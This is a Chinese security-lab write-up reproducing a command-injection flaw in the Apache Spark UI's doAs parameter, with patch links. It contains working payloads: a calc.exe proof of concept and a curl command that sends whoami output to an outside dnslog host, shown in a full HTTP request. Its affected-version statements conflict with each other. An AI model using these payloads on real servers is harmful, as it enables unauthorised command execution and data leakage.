<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jCvb9e_lPWLS01cjw2wqjw)

  

网安引领时代，弥天点亮未来   

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**

Apache Spark 是美国阿帕奇（Apache）基金会的一款支持非循环数据流和内存计算的大规模数据处理引擎。

Apache Spark 3.4.0 之前版本存在命令注入漏洞，**该漏洞源于如果 ACL 启用后**，HttpSecurityFilter 中的代码路径可以允许通过提供任意用户名来执行模拟，这将导致任意 shell 命令执行。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

3.1.1 <= Apache Spark < 3.2.2

利用条件

Apache Spark UI 启用 ACL ，且低权限

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCXFB0fJ4pqGnmN31Y8m1FpC08rVMWjyCWEv3xRx6GF3OQvbziaMbsaOyeUZqcINSicPXLLyONcHADQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 下载部署有漏洞版本环境

powershell 启动命令

```
.\spark-shell.cmd --conf spark.acls.enable=true

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCXFB0fJ4pqGnmN31Y8m1FpOMAZCKHhZicKf5ac5Qs4NYMibkmx7njR590rWw2apk4NicfUnphvLVbRA/640?wx_fmt=png)

访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCXFB0fJ4pqGnmN31Y8m1FpathyPQoDkyPZXicbcp7U3kblibgQvSaBAIgSufPeH7VC28JM4xqDw1Fw/640?wx_fmt=png)

2. 对漏洞进行复现

 **POC （GET）**

```
?doAs=`calc.exe`

```

执行 calc 命令

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCXFB0fJ4pqGnmN31Y8m1FpcyEtCq4mic0uHUNicvPegw3kZVxEzlJKgibfvz2EFKgbrvQiaSYWzp7r0A/640?wx_fmt=png)

dnslog 测试  

```
http://10.211.55.7:4040/jobs/?doAs=`curl+$(whoami)hw9y0l.dnslog.cn`

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCXFB0fJ4pqGnmN31Y8m1Fp0KP7lZ0bEGyphygNhEA2PCZ2iap9GruD29EzqsuGN9rufiaufwnzIFsA/640?wx_fmt=png)

```
GET /jobs/?doAs=`curl+$(whoami)hw9y0l.dnslog.cn` HTTP/1.1
Host: 10.211.55.7:4040
Connection: keep-alive
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0  Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCXFB0fJ4pqGnmN31Y8m1FpXeAW4XIwtxEznWJMYBOIiacBIZNBQ89iaKgwx3O2EVG7wGWMcJsRdrNA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://lists.apache.org/thread/poxgnxhhnzz735kr1wos366l5vdbb0nv
https://zone.huoxian.cn/d/2761-apache-spark-ui-cve-2023-32007

```

**弥天简介**

**学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。**

**口号 网安引领时代，弥天点亮未来**

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)